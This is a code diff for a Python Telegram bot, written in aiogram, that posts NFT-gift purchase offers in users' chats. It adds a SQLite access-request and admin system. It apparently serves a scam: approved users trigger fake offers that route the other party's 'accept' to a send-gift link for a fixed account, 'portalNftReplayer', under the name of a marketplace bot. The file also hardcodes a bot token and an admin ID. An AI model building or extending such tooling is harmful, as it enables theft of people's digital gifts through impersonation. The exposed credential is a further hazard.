@@ -3,22 +3,61 @@ import asyncio
 import logging
 import os
 import aiohttp
+import sqlite3
 from threading import Thread
 from flask import Flask
 from aiogram import Bot, Dispatcher, types, F
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
 
 BOT_TOKEN = "9150035187:AAHA1yqlsiU1CwnGECEMP5VX_1cFrG4t0Ho"
 RENDER_URL = "https://portals-ams5.onrender.com" 
-SECRET_KEY = "/unlock_8f3k2m9x" 
+MAIN_ADMIN_ID = 8438026734
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
 
-AUTHORIZED_USERS = set()
+def init_db():
+    conn = sqlite3.connect('users.db')
+    cursor = conn.cursor()
+    cursor.execute('''CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, role TEXT)''')
+    cursor.execute("INSERT OR IGNORE INTO users (id, role) VALUES (?, ?)", (MAIN_ADMIN_ID, "admin"))
+    conn.commit()
+    conn.close()
+
+def get_user_role(user_id):
+    conn = sqlite3.connect('users.db')
+    cursor = conn.cursor()
+    cursor.execute("SELECT role FROM users WHERE id = ?", (user_id,))
+    result = cursor.fetchone()
+    conn.close()
+    return result[0] if result else None
+
+def add_user(user_id, role="user"):
+    conn = sqlite3.connect('users.db')
+    cursor = conn.cursor()
+    cursor.execute("INSERT OR REPLACE INTO users (id, role) VALUES (?, ?)", (user_id, role))
+    conn.commit()
+    conn.close()
+
+def del_user(user_id):
+    conn = sqlite3.connect('users.db')
+    cursor = conn.cursor()
+    cursor.execute("DELETE FROM users WHERE id = ? AND id != ?", (user_id, MAIN_ADMIN_ID))
+    conn.commit()
+    conn.close()
+
+def get_all_users():
+    conn = sqlite3.connect('users.db')
+    cursor = conn.cursor()
+    cursor.execute("SELECT id, role FROM users")
+    users = cursor.fetchall()
+    conn.close()
+    return users
+
+init_db()
 
 app = Flask(__name__)
 
@@ -67,66 +106,23 @@ TEXTS = {
     }
 }
 
-@dp.business_message(F.text == SECRET_KEY)
-async def unlock_bot(message: types.Message):
-    AUTHORIZED_USERS.add(message.from_user.id)
-    try:
-        await bot.delete_business_messages(
-            business_connection_id=message.business_connection_id,
-            message_ids=[message.message_id]
-        )
-    except Exception:
-        pass
-    await bot.send_message(
-        chat_id=message.chat.id,
-        text="✅ Бот активирован. Теперь вы можете использовать /price.",
-        business_connection_id=message.business_connection_id
-    )
-
-@dp.business_message(F.text.regexp(r"^/(price|prace|proce)\s+"))
-async def handle_price_command(message: types.Message):
-    if message.from_user.id not in AUTHORIZED_USERS:
-        return
-
-    try:
-        await bot.delete_business_messages(
-            business_connection_id=message.business_connection_id,
-            message_ids=[message.message_id]
-        )
-    except Exception as e:
-        logging.error(f"Не удалось удалить команду: {e}")
-
-    command = message.text.split()[0].lower()
-    if command == "/price":
-        lang = "ru"
-    elif command == "/prace":
-        lang = "en"
-    else:
-        lang = "zh"
-    
+async def create_offer(chat_id, user_id, user_full_name, command_text, business_connection_id=None):
+    command = command_text.split()[0].lower()
+    lang = "ru" if command == "/price" else ("en" if command == "/prace" else "zh")
     t = TEXTS[lang]
 
     pattern = r"^/(price|prace|proce)\s+(https?://\S+)\s+([\d\.]+)\s+(gram|stars)(?:\s+(@\w+))?$"
-    match = re.match(pattern, message.text, re.IGNORECASE)
+    match = re.match(pattern, command_text, re.IGNORECASE)
     if not match:
         return
 
     _, nft_link, price_value, currency, target_user = match.groups()
-    currency = currency.lower()
+    price_text = f"{price_value} ⭐" if currency.lower() == "stars" else f"{price_value} 💎"
+    
+    nft_name_formatted = nft_link.split('/')[-1].replace('-', '').capitalize()
+    user_link = f"<a href='tg://user?id={user_id}'>{user_full_name}</a>"
 
-    nft_name_raw = nft_link.split('/')[-1].replace('-', '')
-    nft_name_formatted = nft_name_raw.capitalize() 
-
-    price_text = f"{price_value} ⭐" if currency == "stars" else f"{price_value} 💎"
-
-    user_link = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.full_name}</a>"
-
-    final_text = t["offer"].format(
-        user_link=user_link, 
-        price=price_text, 
-        nft_name=nft_name_formatted, 
-        nft_link=nft_link
-    )
+    final_text = t["offer"].format(user_link=user_link, price=price_text, nft_name=nft_name_formatted, nft_link=nft_link)
 
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text=t["btn_show"], url=nft_link)],
@@ -138,49 +134,232 @@ async def handle_price_command(message: types.Message):
 
     try:
         await bot.send_message(
-            chat_id=message.chat.id,
+            chat_id=chat_id,
             text=final_text,
-            business_connection_id=message.business_connection_id,
+            business_connection_id=business_connection_id,
             reply_markup=keyboard,
             disable_web_page_preview=False
         )
     except Exception as e:
-        logging.error(f"Ошибка при отправке: {e}")
+        logging.error(f"Ошибка при отправке офера: {e}")
+
+@dp.message(F.text == "/start")
+async def start_command(message: types.Message):
+    user_id = message.from_user.id
+    role = get_user_role(user_id)
+
+    if role in ["admin", "user"]:
+        await message.answer("✅ У вас есть доступ. Используйте /price для создания офера.")
+        return
+
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="📩 Запросить доступ", callback_data=f"request:{user_id}")]
+    ])
+    await message.answer("👋 Привет! Для использования бота вам нужно запросить доступ.", reply_markup=keyboard)
+
+@dp.callback_query(F.data.startswith("request:"))
+async def request_access(callback: types.CallbackQuery):
+    user_id = int(callback.data.split(":")[1])
+    
+    admin_text = (
+        f"🔔 <b>Новая заявка на доступ!</b>\n\n"
+        f"👤 Имя: {callback.from_user.full_name}\n"
+        f"🆔 ID: <code>{user_id}</code>\n"
+        f"🔗 Юзернейм: @{callback.from_user.username or 'нет'}"
+    )
+    
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(text="✅ Принять", callback_data=f"approve:{user_id}"),
+            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject:{user_id}")
+        ]
+    ])
+
+    try:
+        await bot.send_message(MAIN_ADMIN_ID, admin_text, reply_markup=keyboard)
+        await callback.message.edit_text("⏳ Заявка отправлена администратору.")
+    except Exception as e:
+        logging.error(f"Ошибка при отправке заявки: {e}")
+    await callback.answer()
+
+@dp.message(F.text == "/adminpanel")
+async def admin_panel(message: types.Message):
+    if get_user_role(message.from_user.id) != "admin":
+        return
+
+    text = (
+        "👑 <b>Админ-панель</b>\n\n"
+        "Доступные команды:\n"
+        "📋 <code>/list_users</code> — Список всех участников\n"
+        "➕ <code>/add_admin [ID]</code> — Назначить админом\n"
+        "➕ <code>/add_user [ID]</code> — Добавить пользователя\n"
+        "❌ <code>/del [ID]</code> — Удалить пользователя по ID\n"
+        "📥 <code>/download_db</code> — Скачать файл базы\n"
+    )
+    
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="📥 Скачать базу (users.db)", callback_data="download_db")]
+    ])
+    
+    await message.answer(text, reply_markup=keyboard)
+
+@dp.message(F.text == "/list_users")
+async def list_users(message: types.Message):
+    if get_user_role(message.from_user.id) != "admin": return
+    users = get_all_users()
+    if not users:
+        await message.answer("В базе нет пользователей.")
+        return
+
+    text = "👥 <b>Список участников:</b>\n\n"
+    for u_id, role in users:
+        icon = "👑" if role == "admin" else "👤"
+        text += f"{icon} <code>{u_id}</code> — {role}\n"
+    
+    await message.answer(text)
+
+@dp.message(F.text.startswith("/add_admin"))
+async def add_admin_cmd(message: types.Message):
+    if get_user_role(message.from_user.id) != "admin": return
+    try:
+        target_id = int(message.text.split()[1])
+        add_user(target_id, "admin")
+        await message.answer(f"👑 Пользователь {target_id} назначен админом.")
+        try:
+            await bot.send_message(target_id, "👑 Вам выданы права администратора в боте.")
+        except:
+            pass
+    except:
+        await message.answer("❌ Формат: /add_admin 123456789")
+
+@dp.message(F.text.startswith("/add_user"))
+async def add_user_cmd(message: types.Message):
+    if get_user_role(message.from_user.id) != "admin": return
+    try:
+        target_id = int(message.text.split()[1])
+        add_user(target_id, "user")
+        await message.answer(f"✅ Пользователь {target_id} добавлен.")
+        try:
+            await bot.send_message(target_id, "🎉 Вам выдан доступ к боту!")
+        except:
+            pass
+    except:
+        await message.answer("❌ Формат: /add_user 123456789")
+
+@dp.message(F.text.startswith("/del"))
+async def del_user_cmd(message: types.Message):
+    if get_user_role(message.from_user.id) != "admin": return
+    
+    args = message.text.split()
+    if len(args) < 2:
+        await message.answer("❌ Формат: /del 123456789 (ID пользователя)")
+        return
+        
+    try:
+        target_id = int(args[1])
+    except ValueError:
+        await message.answer("❌ Ошибка: нужно ввести цифровой ID, а не @юзернейм.")
+        return
+
+    if target_id == MAIN_ADMIN_ID:
+        await message.answer("❌ Нельзя удалить главного админа.")
+        return
+        
+    del_user(target_id)
+    await message.answer(f"✅ Пользователь {target_id} удален из базы.")
+
+@dp.message(F.text == "/download_db")
+async def download_db_cmd(message: types.Message):
+    if get_user_role(message.from_user.id) != "admin": return
+    try:
+        file = FSInputFile("users.db")
+        await message.answer_document(file, caption="📦 Файл базы данных")
+    except Exception as e:
+        await message.answer(f"❌ Ошибка: {e}")
+
+@dp.callback_query(F.data == "download_db")
+async def download_db_callback(callback: types.CallbackQuery):
+    if get_user_role(callback.from_user.id) != "admin": return
+    try:
+        file = FSInputFile("users.db")
+        await callback.message.answer_document(file, caption="📦 Файл базы данных")
+    except Exception as e:
+        await callback.message.answer(f"❌ Ошибка: {e}")
+    await callback.answer()
+
+@dp.callback_query(F.data.startswith("approve:"))
+async def approve_user(callback: types.CallbackQuery):
+    if get_user_role(callback.from_user.id) != "admin": return
+    user_id = int(callback.data.split(":")[1])
+    add_user(user_id, "user")
+    
+    await callback.message.edit_text(f"✅ Пользователь <code>{user_id}</code> одобрен.")
+    try:
+        await bot.send_message(user_id, "🎉 Ваша заявка одобрена! Теперь вы можете использовать /price.")
+    except:
+        pass
+    await callback.answer()
+
+@dp.callback_query(F.data.startswith("reject:"))
+async def reject_user(callback: types.CallbackQuery):
+    if get_user_role(callback.from_user.id) != "admin": return
+    user_id = int(callback.data.split(":")[1])
+    await callback.message.edit_text(f"❌ Пользователь <code>{user_id}</code> отклонен.")
+    try:
+        await bot.send_message(user_id, "❌ Ваша заявка отклонена администратором.")
+    except:
+        pass
+    await callback.answer()
+
+@dp.business_message(F.text.regexp(r"^/(price|prace|proce)\s+"))
+async def handle_business_price(message: types.Message):
+    if get_user_role(message.from_user.id) not in ["admin", "user"]: return
+    try:
+        await bot.delete_business_messages(
+            business_connection_id=message.business_connection_id,
+            message_ids=[message.message_id]
+        )
+    except Exception:
+        pass
+    await create_offer(message.chat.id, message.from_user.id, message.from_user.full_name, message.text, message.business_connection_id)
+
+@dp.message(F.text.regexp(r"^/(price|prace|proce)\s+"))
+async def handle_private_price(message: types.Message):
+    if get_user_role(message.from_user.id) not in ["admin", "user"]: return
+    try:
+        await message.delete()
+    except Exception:
+        pass
+    await create_offer(message.chat.id, message.from_user.id, message.from_user.full_name, message.text)
 
 @dp.callback_query(F.data.startswith("accept:"))
 async def accept_offer(callback: types.CallbackQuery):
     await callback.answer()
-
     try:
         parts = callback.data.split(":")
-        price_str = parts[1]
-        lang = parts[2]
-        
+        price_str, lang = parts[1], parts[2]
         t = TEXTS[lang]
 
-        transfer_bot = "@portals_nftbot"
         target_username = "portalNftReplayer" 
         gift_link = f"tg://send_gift?to={target_username}"
 
-        new_text = t["accepted"].format(
-            transfer_bot=transfer_bot, 
-            price=price_str
-        )
-
+        new_text = t["accepted"].format(transfer_bot="@portals_nftbot", price=price_str)
         new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text=t["btn_transfer"], url=gift_link)]
         ])
 
-        await bot.edit_message_text(
-            text=new_text,
-            chat_id=callback.message.chat.id,
-            message_id=callback.message.message_id,
-            reply_markup=new_keyboard,
-            business_connection_id=callback.message.business_connection_id
-        )
+        if callback.message.business_connection_id:
+            await bot.edit_message_text(
+                text=new_text, chat_id=callback.message.chat.id, message_id=callback.message.message_id,
+                reply_markup=new_keyboard, business_connection_id=callback.message.business_connection_id
+            )
+        else:
+            await bot.edit_message_text(
+                text=new_text, chat_id=callback.message.chat.id, message_id=callback.message.message_id,
+                reply_markup=new_keyboard
+            )
     except Exception as e:
         logging.error(f"Ошибка в кнопке: {e}")
-        await callback.answer(f"Ошибка: {e}", show_alert=True)
 
 @dp.callback_query(F.data.startswith("decline:"))
 async def decline_offer(callback: types.CallbackQuery):
@@ -191,8 +370,8 @@ async def decline_offer(callback: types.CallbackQuery):
 async def main():
     Thread(target=run_flask, daemon=True).start()
     asyncio.create_task(keep_alive()) 
-    print("Бот запущен. Ожидание секретного ключа...")
-    await dp.start_polling(bot, allowed_updates=["business_connection", "business_message", "callback_query"])
+    print("Бот запущен.")
+    await dp.start_polling(bot, allowed_updates=["business_connection", "business_message", "callback_query", "message"])
 
 if __name__ == "__main__":
     try:
